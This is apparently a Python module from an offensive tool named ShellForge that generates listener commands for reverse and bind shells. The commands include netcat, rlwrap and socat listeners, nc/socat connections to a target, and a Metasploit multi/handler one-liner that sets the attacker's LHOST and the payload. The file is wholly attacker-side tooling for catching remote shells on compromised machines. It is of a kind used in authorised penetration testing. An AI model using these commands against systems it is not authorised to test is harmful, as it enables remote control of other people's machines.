"""
Listener helper commands for ShellForge.

Prints nc / rlwrap / socat / msfconsole multi-handler listener snippets.

Author: Mostafa Tamime
"""

from __future__ import annotations


def listener_commands(
    port: int,
    shell_type: str = "reverse",
    ip: str = "0.0.0.0",
    payload_hint: str = "generic/shell_reverse_tcp",
) -> str:
    """
    Return formatted listener command suggestions for *port*.

    Parameters
    ----------
    port:
        Listening port.
    shell_type:
        ``reverse`` or ``bind`` — adjusts msf payload suggestion.
    ip:
        LHOST for msfconsole (attacker IP for reverse shells).
    payload_hint:
        Metasploit payload module name.
    """
    if shell_type == "bind":
        msf_payload = "generic/shell_bind_tcp"
        msf_host_line = f"set RHOST {ip}"
        connect_note = (
            f"# For bind shells, connect TO the target:\n"
            f"#   nc {ip} {port}\n"
            f"#   socat - TCP:{ip}:{port}\n"
        )
    else:
        msf_payload = payload_hint
        msf_host_line = f"set LHOST {ip}"
        connect_note = ""

    return f"""[*] Listener commands for port {port} ({shell_type}):

# netcat
nc -lvnp {port}

# netcat with rlwrap (better readline)
rlwrap nc -lvnp {port}

# socat (full TTY)
socat file:`tty`,raw,echo=0 tcp-listen:{port}

{connect_note}# Metasploit multi/handler
msfconsole -q -x "use multi/handler; set payload {msf_payload}; {msf_host_line}; set LPORT {port}; run"
"""


def print_listeners(
    port: int,
    shell_type: str = "reverse",
    ip: str = "0.0.0.0",
) -> None:
    """Print listener helper commands to stdout."""
    print(listener_commands(port, shell_type=shell_type, ip=ip))
